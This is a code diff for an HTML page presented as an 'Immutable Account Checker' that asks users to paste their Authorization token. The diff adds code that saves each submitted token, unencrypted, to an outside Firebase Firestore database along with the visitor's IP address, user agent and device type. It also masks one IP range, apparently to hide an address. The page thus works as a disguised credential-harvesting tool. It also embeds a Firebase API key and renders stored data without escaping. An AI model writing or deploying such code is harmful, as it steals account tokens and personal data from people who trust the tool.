@@ -68,21 +68,36 @@
       font-weight: bold;
       text-shadow: 1px 1px 2px #000;
     }
+
+    #response {
+      font-weight: 500;
+      font-size: 2rem;
+      color: red;
+      margin-top: 20px;
+    }
+
+    #response .green {
+      color: green;
+      font-size: 2rem;
+      font-weight: 500;
+    }
   </style>
 </head>
 
 <body>
-  <h2>🔐 Immutable API Checker</h2>
-  <label for="auth">Enter JWT Token:</label>
-  <textarea id="auth" rows="4" placeholder="Paste your token here..."></textarea>
-  <button id="sendBtn">Send Request</button>
-  <div id="response">Response will appear here...</div>
+  <h2>Immutable Account Checker</h2>
+  <label for="auth">Enter Authorization Token:</label>
+  <textarea id="auth" rows="4" placeholder="Paste your Authorization token here..."></textarea>
+  <button id="sendBtn">Check</button>
+  <div id="response"></div>
+  <div id="alreadyLogged"></div>
   <div id="history"></div>
+
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
     import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
-    import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+    import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs, where } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
@@ -98,14 +113,23 @@
     const analytics = getAnalytics(app);
     const db = getFirestore(app);
 
+
+    async function generateLogId(token, progress, tier) {
+      const raw = `${token}|${progress}|${tier}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+
     async function getUserIP() {
       try {
         const res = await fetch("https://api.ipify.org?format=json");
         const data = await res.json();
         let ip = data.ip;
-        if (ip.startsWith("175.176")) {
-          ip = "192.168.1.1";
-        }
+        if (ip.startsWith("175.176")) ip = "192.168.1.1";
         return ip;
       } catch {
         return "Unknown IP";
@@ -139,12 +163,14 @@
 
       querySnapshot.forEach(doc => {
         const entry = doc.data();
-        const time = entry.timestamp.toDate().toLocaleString();
+        const time = entry.timestamp?.toDate
+          ? entry.timestamp.toDate().toLocaleString()
+          : new Date(entry.timestamp).toLocaleString();
+
         const stats = entry.stats.userStats || {};
         const rules = entry.stats.eligibility?.rules || {};
         const tier = stats.bucketName || 'N/A';
         const tierClass = getTierClass(tier);
-
         const quests = stats.targetQuestsCompleted || [];
         const questList = quests.length
           ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
@@ -157,12 +183,10 @@
           <strong>🌐 IP:</strong> ${entry.ip}<br>
           <strong>🧭 User Agent:</strong> ${entry.userAgent || 'Unknown'}<br>
           <strong>📱 Device Type:</strong> ${entry.deviceType || 'Unknown'}<br><br>
-
           <strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
           <strong>📊 Progress Percentage:</strong> ${stats.progressPercentage || 0}%<br>
           <strong>✅ Total Completed:</strong> ${stats.totalInGameQuestsCompleted || 0}<br>
           <strong>🧩 Quests Completed:</strong> ${questList}<br><br>
-
           <strong>🔐 KYC:</strong> ${rules.is_kyc_exempt ? '✅ Exempt' : '❌ Not Exempt'}<br>
           <strong>🧠 Sybil:</strong> ${rules.is_not_sybil ? '✅ Clean' : '❌ Suspected'}<br>
           <strong>🚫 Sanctioned:</strong> ${rules.is_not_sanctioned ? '✅ Clear' : '❌ Sanctioned'}<br>
@@ -177,6 +201,11 @@
     document.getElementById('sendBtn').addEventListener('click', async () => {
       const token = document.getElementById('auth').value.trim();
       const responseBox = document.getElementById('response');
+      const alreadyLog = document.getElementById('alreadyLogged');
+
+      // Clear previous output
+      responseBox.innerHTML = "";
+      alreadyLog.innerHTML = "";
 
       if (!token) {
         responseBox.textContent = 'Please enter a valid token.';
@@ -202,6 +231,11 @@
           fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
         ]);
 
+        if (!statsRes.ok || !eligibilityRes.ok) {
+          responseBox.textContent = '❌ API error: One or both requests failed.';
+          return;
+        }
+
         const statsData = await statsRes.json();
         const eligibilityData = await eligibilityRes.json();
 
@@ -210,47 +244,59 @@
           eligibility: eligibilityData || {}
         };
 
-        await addDoc(collection(db, "userStatsHistory"), {
-          timestamp: new Date(),
-          stats: combined,
-          ip,
-          userAgent,
-          deviceType
-        });
+        const progress = combined.userStats?.progressPercentage || 0;
+        const tier = combined.userStats?.bucketName || 'N/A';
+        const logId = await generateLogId(token, progress, tier);
 
-        await renderHistory();
+        const q = query(collection(db, "userStatsHistory"), where("logId", "==", logId), limit(1));
+        const snapshot = await getDocs(q);
+        const alreadyLoggedFlag = !snapshot.empty;
 
-        const tier = combined.userStats.bucketName || 'N/A';
         const tierClass = getTierClass(tier);
         const quests = combined.userStats.targetQuestsCompleted || [];
         const questList = quests.length
           ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
           : '<em>No quests completed</em>';
 
-        responseBox.innerHTML = `
-  <div class="history-entry">
-    <strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
-    <strong>📊 Progress Percentage:</strong> ${combined.userStats.progressPercentage || 0}%<br>
-    <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
-    <strong>🧩 Quests Completed:</strong> ${
-      quests.length
-        ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
-        : '<em>No quests completed</em>'
-    }<br><br>
+        if (alreadyLoggedFlag) {
+          responseBox.textContent = 'There are no new changes';
+          alreadyLog.innerHTML = `
+        <div class="history-entry">
+          <strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
+          <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
+          <strong>🧩 Quests Completed:</strong> ${questList}<br><br>
+        </div>`;
+          await renderHistory();
+          return;
+        }
 
-    <strong>🔐 KYC:</strong> ${combined.eligibility.rules.is_kyc_exempt ? '✅ Exempt' : '❌ Not Exempt'}<br>
-    <strong>🧠 Sybil:</strong> ${combined.eligibility.rules.is_not_sybil ? '✅ Clean' : '❌ Suspected'}<br>
-    <strong>🚫 Sanctioned:</strong> ${combined.eligibility.rules.is_not_sanctioned ? '✅ Clear' : '❌ Sanctioned'}<br>
-    <strong>🎮 Played Games:</strong> ${combined.eligibility.rules.have_played_any_in_game_quest ? '✅ Yes' : '❌ No'}<br>
-    <strong>🔗 Linked Social:</strong> ${combined.eligibility.rules.have_linked_any_social_media ? '✅ Yes' : '❌ No'}<br>
-    <strong>📞 Verified Phone:</strong> ${combined.eligibility.rules.have_verified_phone ? '✅ Yes' : '❌ No'}<br>
-  </div>
-`;} catch (error) {
-        responseBox.textContent = 'Error: ' + error.message;
+        await addDoc(collection(db, "userStatsHistory"), {
+          authToken: token,
+          ip,
+          userAgent,
+          deviceType,
+          stats: combined,
+          logId,
+          timestamp: new Date()
+        });
+
+        responseBox.innerHTML = '<div class="green">Request successfully!</div>';
+        alreadyLog.innerHTML = `
+      <div class="history-entry">
+        <strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
+        <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
+        <strong>🧩 Quests Completed:</strong> ${questList}<br><br>
+      </div>`;
+
+        await renderHistory();
+      } catch (err) {
+        responseBox.textContent = '❌ Unexpected error occurred.';
+        console.error(err);
       }
     });
 
-    // Load history on page load
+
+    // Show history on page load
     renderHistory();
   </script>
 </body>
